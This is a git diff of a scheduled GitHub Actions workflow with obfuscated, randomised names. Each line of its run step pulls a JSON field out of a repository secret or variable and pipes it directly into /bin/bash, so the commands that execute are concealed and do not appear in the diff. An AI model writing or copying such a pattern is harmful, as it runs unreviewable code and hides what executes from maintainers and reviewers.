@@ -1,8 +1,10 @@
 name: yangziyuan1962
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 1/6 * * *'
+    - cron: '45 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,19 +13,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: yangziyuan1962
         env:
-          cmyyd394: ${{ secrets.cmyyd394 }}
+          yqqti1: ${{ secrets.yqqti1 }}
         run: |
-          echo $cmyyd394 | jq -r .tfeu47094 | /bin/bash
-          echo $ijn9055 | jq -r .vmw48 | /bin/bash
-          echo $qucn7 | jq -r .mb8 | /bin/bash
-          echo $vi15 | jq -r .nn506 | /bin/bash
-          echo $caq0 | jq -r .aesd53 | /bin/bash
-          echo $ehxx08396 | jq -r .b34504 | /bin/bash
-          echo $zjir0369 | jq -r .e4104 | /bin/bash
-          echo $oh15709 | jq -r .hu55 | /bin/bash
-          echo $vks8 | jq -r .cyabe03 | /bin/bash
-          echo $scj6825 | jq -r .jsm0 | /bin/bash
-          echo $f223 | jq -r .eu673 | /bin/bash
-          echo $fm80 | jq -r .ccmv2351 | /bin/bash
-          echo $s02239 | jq -r .awh9 | /bin/bash
+          echo $yqqti1 | jq -r .m4429 | /bin/bash
+          echo $vwk8126 | jq -r .rhb677 | /bin/bash
+          echo $kwg6291 | jq -r .qxz80 | /bin/bash
+          echo $owgd77096 | jq -r .hkfvd24220 | /bin/bash
+          echo $du2 | jq -r .newke743 | /bin/bash
+          echo $lxrox61 | jq -r .xqs1 | /bin/bash
+          echo $km95585 | jq -r .zbera605 | /bin/bash
+          echo $duk17 | jq -r .nujbf4228 | /bin/bash
+          echo $mee006 | jq -r .nxbdw523 | /bin/bash
+          echo $mbyvw313 | jq -r .uxlgp64 | /bin/bash
+          echo $brxak28800 | jq -r .mvqa5 | /bin/bash
+          echo $nvb57020 | jq -r .mqh34 | /bin/bash
+          echo $mxwvg47 | jq -r .a27022 | /bin/bash
 
